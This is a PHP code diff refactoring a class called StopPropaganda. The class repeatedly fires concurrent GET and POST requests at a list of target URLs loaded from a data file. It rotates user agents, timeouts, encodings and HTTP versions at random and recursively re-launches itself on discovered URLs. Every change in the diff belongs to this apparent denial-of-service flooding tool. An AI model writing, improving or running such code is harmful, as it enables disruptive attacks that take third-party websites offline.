@@ -9,57 +9,57 @@ use Httpful\Factory;
 use Httpful\Http;
 use Httpful\Request;
 use Httpful\Response;
+use Throwable;
 use voku\helper\HtmlDomParser;
 use voku\helper\UTF8;
+use function array_values;
+use function random_int;
+use function shuffle;
 
 class StopPropaganda
 {
     /**
-     * @var string[]
+     * @var null|string[]
      */
-    private $browserAgents = [];
+    private static $browserAgents;
+
+    /**
+     * @var null|string[]
+     */
+    private static $urlTargetsAll;
+
     /**
      * @var string[]
      */
-    private $urlTargets = [];
+    private $urlTargets;
 
     public function __construct($urlTargets = [])
     {
-        static $PROCESSED = [];
-
-        if ($urlTargets === []) {
-            $this->urlTargets = include __DIR__ . '/data/url_targets.php';
-        } else {
-            $this->urlTargets = $urlTargets;
+        if (self::$browserAgents === null) {
+            self::$browserAgents = include __DIR__ . '/data/browser_agents.php';
         }
 
-        foreach ($this->urlTargets as &$urlTarget) {
-            if (isset($PROCESSED[$urlTarget])) {
-                $PROCESSED[$urlTarget]++;
-            } else {
-                $PROCESSED[$urlTarget] = 1;
-            }
+        if (self::$urlTargetsAll === null) {
+            self::$urlTargetsAll = include __DIR__ . '/data/url_targets.php';
+        }
 
-            if ($PROCESSED[$urlTarget] > 100) {
-                $PROCESSED[$urlTarget] = 1;
-
-                $urlTarget .= \strpos($urlTarget, '?') === false ? '?' : '&' . 'param=' . $this->random_float(0, 1000);
-            }
+        if ($urlTargets === []) {
+            $this->urlTargets = self::$urlTargetsAll;
+        } else {
+            $this->urlTargets = $urlTargets;
         }
 
         shuffle($this->urlTargets);
 
         // DEBUG
         var_dump($this->urlTargets);
-
-        $this->browserAgents = include __DIR__ . '/data/browser_agents.php';
     }
 
     private function getRandomBrowserAgent(): string
     {
-        $randomIndex = array_rand($this->browserAgents);
+        $randomIndex = array_rand(self::$browserAgents);
 
-        return $this->browserAgents[$randomIndex];
+        return self::$browserAgents[$randomIndex];
     }
 
     /**
@@ -70,7 +70,7 @@ class StopPropaganda
      */
     private function random_float($min, $max)
     {
-        return \random_int($min, $max - 1) + (\random_int(0, PHP_INT_MAX - 1) / PHP_INT_MAX);
+        return random_int($min, $max - 1) + (random_int(0, PHP_INT_MAX - 1) / PHP_INT_MAX);
     }
 
     /**
@@ -102,11 +102,11 @@ class StopPropaganda
                         }
 
                         try {
-                            $stopPropagandaInner = new StopPropaganda(\array_values($urls));
+                            $stopPropagandaInner = new StopPropaganda(array_values($urls));
                             $stopPropagandaInner->start();
-                        } catch (\Throwable $e) {
+                        } catch (Throwable $e) {
                             // DEBUG
-                            //var_dump($e->__toString());
+                            var_dump($e->__toString());
                         }
                     }
                 }
@@ -114,13 +114,14 @@ class StopPropaganda
         );
 
         foreach ($this->urlTargets as $url) {
-            $request = (new Request($this->random_float(0, 1) > 0.5 ? Http::GET : Http::POST))
+            $request = (new Request($this->random_float(0, 100) > 50 ? Http::GET : Http::POST))
                   ->withUriFromString($url)
                   ->withUserAgent($this->getRandomBrowserAgent())
-                  ->followRedirects(true)
-                  ->withConnectionTimeoutInSeconds($this->random_float(1, 2))
+                  ->followRedirects()
+                  ->withConnectionTimeoutInSeconds($this->random_float(1, 5))
                   ->withTimeout($this->random_float(1, 5))
-                  ->withContentEncoding($this->random_float(0, 1) > 0.5 ? 'gzip' : 'deflate')
+                  ->withContentEncoding($this->random_float(0, 100) > 50 ? 'gzip' : 'deflate')
+                  ->withProtocolVersion($this->random_float(0, 100) > 80 ? Http::HTTP_2_0 : Http::HTTP_1_1)
                   ->expectsHtml();
 
             $multi->add_request($request);
@@ -130,11 +131,11 @@ class StopPropaganda
 
         if ($outerLoopUrls !== []) {
             try {
-                $stopPropagandaInner = new StopPropaganda(\array_values($outerLoopUrls));
+                $stopPropagandaInner = new StopPropaganda(array_values($outerLoopUrls));
                 $stopPropagandaInner->start();
-            } catch (\Throwable $e) {
+            } catch (Throwable $e) {
                 // DEBUG
-                //var_dump($e->__toString());
+                var_dump($e->__toString());
             }
         }
     }
